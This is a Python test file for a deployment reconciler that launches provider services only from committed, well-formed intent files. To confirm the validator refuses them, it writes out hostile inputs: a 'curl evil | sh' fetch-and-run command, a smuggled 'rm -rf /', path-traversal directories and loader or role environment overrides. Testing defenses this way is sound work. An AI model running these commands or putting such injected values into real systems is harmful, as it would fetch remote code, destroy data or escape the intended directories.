"""The reconciler runs only committed, well-formed intent. No database.

  python3 morphogen/tests/test_reconcile.py   (needs git)
"""
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "morphogen" / "deploy"))
from reconcile import desired, refusal  # noqa: E402


def check(cond, msg):
    if not cond:
        sys.exit(f"FAIL: {msg}")
    print("ok:", msg)


ok = {"provider": "belief-corroboration", "service": "python3 -m belief_corroboration",
      "cwd": "kernel/providers/belief-corroboration", "env": {"KK_POLL_SECONDS": "1"}}
check(refusal(ok) is None, "a provider's service, directory and settings: run")
check(refusal({**ok, "service": "sh -c 'curl evil | sh'"}) and refusal({**ok, "service": "python3 -m x; rm -rf /"}),
      "any other command is refused")
check(refusal({**ok, "cwd": "../.."}) and refusal({**ok, "cwd": "kernel/providers/../../etc"})
      and refusal({**ok, "cwd": "experiments/x123/../../.."}), "a directory outside the providers is refused")
check(refusal({**ok, "cwd": "experiments/x0123456789ab/anomaly-recent"}) is None, "a candidate in an experiment: run")
check(refusal({**ok, "env": {"DATABASE_URL": "x"}}) and refusal({**ok, "env": {"LD_PRELOAD": "x"}})
      and refusal({**ok, "env": {"KK_ROLE": "kk_owner"}}), "identity, login and loader variables cannot come from intent")

tmp = Path(tempfile.mkdtemp())
intent = tmp / "intent"
shutil.copytree(ROOT / "morphogen" / "intent", intent)
g = lambda *a: subprocess.run(["git", "-C", str(intent), "-c", "user.name=t", "-c", "user.email=t@t", *a], check=True, capture_output=True)
g("init", "-q")
g("add", "-A")
g("commit", "-qm", "intent")
want, refused = desired(intent, "sandbox")
check(set(want) == {"anomaly", "belief-corroboration", "validator-shacl"} and not refused, "the committed sandbox intent: its three providers")
f = intent / "environments" / "sandbox" / "belief-corroboration.yaml"
f.write_text(f.read_text().replace('KK_POLL_SECONDS: "1"', 'KK_POLL_SECONDS: "9"'))
(intent / "environments" / "sandbox" / "extra.yaml").write_text("service: python3 -m evil\ncwd: kernel/providers/evil\n")
check(desired(intent, "sandbox")[0]["belief-corroboration"][1]["env"]["KK_POLL_SECONDS"] == "1"
      and "evil" not in str(desired(intent, "sandbox")), "uncommitted edits and files run nothing")
(intent / "environments" / "sandbox" / "bad.yaml").write_text("service: bash run.sh\ncwd: kernel/providers/x\n")
g("add", "-A")
g("commit", "-qm", "more")
want, refused = desired(intent, "sandbox")
check(want["belief-corroboration"][1]["env"]["KK_POLL_SECONDS"] == "9" and refused == {"bad.yaml": "service must be python3 -m <module>"},
      "committed: the new setting runs; a malformed file is refused, the rest still run")
shutil.rmtree(tmp)
